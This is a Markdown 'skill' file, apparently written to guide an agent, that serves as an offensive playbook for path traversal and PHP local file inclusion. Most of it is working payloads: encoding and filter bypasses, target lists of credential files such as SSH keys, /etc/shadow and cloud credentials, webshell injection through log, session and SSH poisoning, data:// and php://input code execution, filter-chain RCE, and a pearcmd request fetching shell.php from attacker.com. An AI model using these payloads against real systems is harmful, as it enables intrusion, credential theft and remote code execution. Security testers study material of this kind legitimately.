---
name: path-traversal-lfi
description: >-
  Path traversal and LFI playbook. Use when file paths, download endpoints, include operations, archive extraction, or wrapper behavior may expose filesystem control.
---

# SKILL: Path Traversal / Local File Inclusion (LFI)

## 0. RELATED ROUTING

- [upload insecure files](../upload-insecure-files/SKILL.md) for upload-based attacks
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) for Java backend traversal bypass

### First-pass traversal chains

```text
../etc/passwd
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..\\..\\..\\windows\\win.ini
```

---

## 1. CORE CONCEPT

**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.  
**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code.

---

## 2. TRAVERSAL SEQUENCE VARIANTS

```
# Basic
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts

# URL Encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5c

# Double URL Encoding
%252e%252e%252f%252e%252f
..%252f..%252fetc%252fpasswd

# Unicode / Overlong UTF-8
..%c0%af..%c0%af    # overlong '/' 
..%ef%bc%8f        # fullwidth solidus

# Filter bypass (strips ../)
....//....//etc/passwd
..././..././

# Null Byte (PHP < 5.3.4)
../../../../etc/passwd%00.jpg
```

---

## 3. TARGET FILES

### Linux
```
/etc/passwd                   # user list
/etc/shadow                   # password hashes (requires root read)
/proc/self/environ            # env vars (DB creds, API keys!)
/proc/self/cmdline            # process command line
/var/log/apache2/access.log   # for log poisoning
/var/log/nginx/access.log
/var/log/auth.log
/home/USER/.ssh/id_rsa        # SSH private key
/home/USER/.aws/credentials
/tmp/sess_SESSIONID           # PHP session files
```

### Web Config
```
/var/www/html/.env
/var/www/html/wp-config.php
/etc/nginx/sites-enabled/
```

### Windows
```
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Windows\System32\config\SAM
```

---

## 4. PHP LFI → RCE TECHNIQUES

### Log Poisoning

```http
# Step 1: Inject PHP in User-Agent to access log
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# Step 2: Include log
?page=../../../../var/log/apache2/access.log&cmd=id
```

### SSH Log Poisoning

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# Then include: /var/log/auth.log
```

### PHP Session Poisoning

```
# Set PHP code as session variable value
# Include: ?page=../../../../tmp/sess_PHPSESSID&cmd=id
```

### PHP Wrappers

```
# Read source code:
?page=php://filter/convert.base64-encode/resource=config.php

# Execute via input:
POST ?page=php://input
Body: <?php system('id'); ?>

# Execute via data:
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

# expect (if extension installed):
?page=expect://id

# phar (deserialization via metadata):
phar:///tmp/upload.phar/anything

# zip:
zip:///tmp/upload.zip#shell.php
```

---

## 5. PHP FILTER CHAIN RCE (synacktiv)

```bash
# Generates chains that write arbitrary PHP without file upload
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|...|/resource=php://temp

# Blind file read oracle
# Tool: synacktiv/php_filter_chains_oracle_exploit
```

---

## 6. PEARCMD LFI TO RCE

```
# config-create (write arbitrary content to file)
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php

# download (fetch remote file)
GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php
```

---

## 7. PARAMETER LOCATIONS TO TEST

```
?file=  ?page=  ?include=  ?path=  ?doc=  ?view=
?load=  ?read=  ?template=  ?lang=  ?url=  ?src=
```

---

## 8. FILTER BYPASS CHECKLIST

```
[] Try URL encoding: %2e%2e%2f
[] Try double URL encoding: %252e%252e%252f
[] Try overlong UTF-8: ..%c0%af
[] Try redundant sequences: ....// or ..././
[] Try null byte: /../../../etc/passwd%00
[] Try absolute path: /etc/passwd
[] Try Windows UNC: \\127.0.0.1\C$\Windows\win.ini
```

---

## 9. JAVA / SPRING PATH TRAVERSAL

```text
# Read WEB-INF files
GET /download?file=../WEB-INF/web.xml
GET /download?file=../WEB-INF/classes/application.properties

# Spring MVC ResourceHttpRequestHandler
GET /static/..%252f..%252fWEB-INF/web.xml
GET /static/..;/..;/WEB-INF/web.xml   # Tomcat path parameter normalization
```

### Tomcat AJP Ghostcat (CVE-2020-1938)

```bash
python3 ajpShooter.py http://target:8009 /WEB-INF/web.xml read
```

---

## 10. NGINX ALIAS MISCONFIGURATION

```nginx
# VULNERABLE
location /assets {
    alias /data/;
}
```

```text
GET /assets../etc/passwd HTTP/1.1
GET /assets..%2f..%2fetc%2fpasswd HTTP/1.1
```

---

## 11. IIS SHORT FILENAME (~1 TILDE)

```text
GET /W~1.ASP HTTP/1.1   -> 404 = file starting with W exists
GET /Z~1.ASP HTTP/1.1   -> 400 = bad request

java -jar iis_shortname_scanner.jar https://target.com/
```

---

## 12. IMPACT ESCALATION PATH

```
Path traversal (read arbitrary files)
├── /proc/self/environ → API keys, DB passwords
├── Read app config files → credentials
├── Read SSH private keys → direct server login
└── Find log paths → Log Poisoning → LFI RCE

LFI (PHP code inclusion)
├── Log poisoning → webshell
├── Session file poisoning → webshell
├── php://input → direct code execution
├── data:// → direct code execution
└── php://filter → read PHP source → find more vulns
```
